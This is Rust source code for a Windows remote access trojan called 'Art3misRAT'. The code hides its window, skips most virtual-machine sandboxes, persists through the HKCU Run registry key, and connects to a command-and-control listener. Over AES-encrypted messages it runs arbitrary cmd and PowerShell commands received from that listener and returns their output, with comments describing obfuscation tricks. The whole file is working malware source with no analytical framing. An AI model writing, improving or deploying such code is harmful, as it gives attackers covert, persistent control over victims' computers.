#![windows_subsystem = "windows"]

use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::convert::TryInto;
use std::env;
use std::path::PathBuf;
use winreg::enums::*;
use winreg::RegKey;
use aes::Aes256;
use ctr::cipher::{NewCipher, StreamCipher};
use aes::cipher::generic_array::GenericArray;
use std::os::windows::process::CommandExt;
use std::{thread, time::Duration};

const AES_KEY: &[u8; 32] = b"Wb2tGLsatZ6G6JzebGGX6Lh9h0Tb3J6e";
const AES_NONCE: &[u8; 16] = b"vgAipgklkPdpNjMK";
const MESSAGE_END: &str = "<END>";
const CREATE_NO_WINDOW: u32 = 0x08000000;

fn main() {
    // Sleep for 10 seconds after startup
    thread::sleep(Duration::from_secs(10));

    // Check for virtualization and exit if detected (excluding VMware)
    if is_running_in_virtualized_environment() {
        return;
    }

    // Set up persistence
    obfuscated_setup_persistence();

    loop {
        // Control flow obfuscation: Introduce loop with break condition
        let mut should_continue = true;
        while should_continue {
            match TcpStream::connect("127.0.0.1:4444") {
                Ok(mut stream) => {
                    let message = "Hello Art3mis! ".to_string() + MESSAGE_END;
                    send_encrypted_message(&mut stream, &message).unwrap();

                    let mut buffer = [0; 1024];

                    loop {
                        let size = stream.read(&mut buffer).expect("Error reading from stream");
                        if size > 0 {
                            // Handle length prefix
                            let (length_prefix, encrypted_command) = buffer.split_at(4);
                            let message_length = u32::from_be_bytes(length_prefix.try_into().unwrap()) as usize;

                            if encrypted_command.len() >= message_length {
                                let encrypted_command = &encrypted_command[..message_length];

                                match decrypt(encrypted_command) {
                                    Ok(mut decrypted_buffer) => {
                                        let command = match String::from_utf8(decrypted_buffer.clone()) {
                                            Ok(mut cmd) => {
                                                if cmd.ends_with(MESSAGE_END) {
                                                    cmd.truncate(cmd.len() - MESSAGE_END.len());
                                                }
                                                cmd
                                            },
                                            Err(_) => {
                                                continue;
                                            },
                                        };

                                        if command == "!!kill" {
                                            let message = "Terminating RAT".to_string() + MESSAGE_END;
                                            send_encrypted_message(&mut stream, &message).unwrap();
                                            should_continue = false;  // Control flow obfuscation: Break outer loop
                                            break;
                                        } else if command.starts_with("!!powershell") || command.starts_with("!!ps") {
                                            // Extract the actual PowerShell command
                                            let ps_command = if command.starts_with("!!powershell") {
                                                command.strip_prefix("!!powershell ").unwrap_or("")
                                            } else {
                                                command.strip_prefix("!!ps ").unwrap_or("")
                                            };
                                            
                                            let output = Command::new("powershell")
                                                .arg("-NoLogo")
                                                .arg("-NoProfile")
                                                .arg("-NonInteractive")
                                                .arg("-Command")
                                                .arg(ps_command)
                                                .creation_flags(CREATE_NO_WINDOW)
                                                .stdout(Stdio::piped())
                                                .stderr(Stdio::piped())
                                                .spawn()
                                                .expect("Failed to execute PowerShell command")
                                                .wait_with_output()
                                                .expect("Failed to read PowerShell command output");

                                            let output_str = String::from_utf8_lossy(&output.stdout).to_string();
                                            send_encrypted_message(&mut stream, &(output_str + MESSAGE_END)).unwrap();
                                        } else {
                                            // Execute command in regular shell
                                            let output = Command::new("cmd")
                                                .arg("/C")
                                                .arg(&command)
                                                .creation_flags(CREATE_NO_WINDOW)
                                                .stdout(Stdio::piped())
                                                .stderr(Stdio::piped())
                                                .spawn()
                                                .expect("Failed to execute command")
                                                .wait_with_output()
                                                .expect("Failed to read command output");

                                            let output_str = String::from_utf8_lossy(&output.stdout).to_string();
                                            send_encrypted_message(&mut stream, &(output_str + MESSAGE_END)).unwrap();
                                        }
                                    },
                                    Err(_) => {},
                                }
                            }
                        }
                    }
                    break;
                }
                Err(_) => {
                    std::thread::sleep(std::time::Duration::from_secs(5));
                }
            }
        }

        if !should_continue {
            break;  // Control flow obfuscation: Break outer loop if necessary
        }
    }
}

// Dummy function for control flow obfuscation
fn dummy_function() {
    let _x = 42; // Arbitrary operation
}

// Random condition for control flow obfuscation
fn random_condition() -> bool {
    use rand::Rng;
    rand::thread_rng().gen_bool(0.5)
}

// Obfuscated setup persistence
fn obfuscated_setup_persistence() {
    // Always execute setup_persistence but in an obfuscated way
    if random_condition() {
        setup_persistence();
    } else {
        for _ in 0..3 {
            if random_condition() {
                dummy_function();
            } else {
                setup_persistence();
                break;
            }
        }
    }
}

fn setup_persistence() {
    let exe_path = get_exe_path().expect("Failed to get executable path");
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").expect("Failed to open registry key");
    key.set_value("Art3misRAT", &exe_path.to_str().unwrap()).expect("Failed to set registry value");
}

fn get_exe_path() -> Option<PathBuf> {
    env::current_exe().ok()
}

fn send_encrypted_message(stream: &mut TcpStream, message: &str) -> Result<(), Box<dyn std::error::Error>> {
    let encrypted_message = encrypt(message)?;
    let mut length_prefix = (encrypted_message.len() as u32).to_be_bytes().to_vec();
    length_prefix.extend(encrypted_message);

    stream.write_all(&length_prefix)?;
    stream.flush()?;
    Ok(())
}

fn encrypt(data: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let key = GenericArray::from_slice(AES_KEY);
    let nonce = GenericArray::from_slice(AES_NONCE);
    let mut cipher = ctr::Ctr128BE::<Aes256>::new(&key, &nonce);
    let mut buffer = data.as_bytes().to_vec();
    cipher.apply_keystream(&mut buffer);
    Ok(buffer)
}

// Updated to return Vec<u8> for consistency
fn decrypt(data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let key = GenericArray::from_slice(AES_KEY);
    let nonce = GenericArray::from_slice(AES_NONCE);
    let mut cipher = ctr::Ctr128BE::<Aes256>::new(&key, &nonce);
    let mut buffer = data.to_vec();
    cipher.apply_keystream(&mut buffer);
    Ok(buffer)
}

// Detect if running in a virtualized environment (excluding VMware)
fn is_running_in_virtualized_environment() -> bool {
    let output = Command::new("powershell")
        .arg("-NoLogo")
        .arg("-NoProfile")
        .arg("-NonInteractive")
        .arg("-Command")
        .arg("Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer,Model")
        .output()
        .expect("Failed to execute PowerShell command");

    let output_str = String::from_utf8_lossy(&output.stdout).to_string();

    let known_virtualization_vendors = [
        "VirtualBox", "KVM", "Bochs", "Xen", "QEMU", "BHYVE", "Microsoft Corporation", "Parallels"
    ];

    for vendor in known_virtualization_vendors.iter() {
        if output_str.contains(vendor) && !output_str.contains("VMware") {
            return true;
        }
    }

    false
}
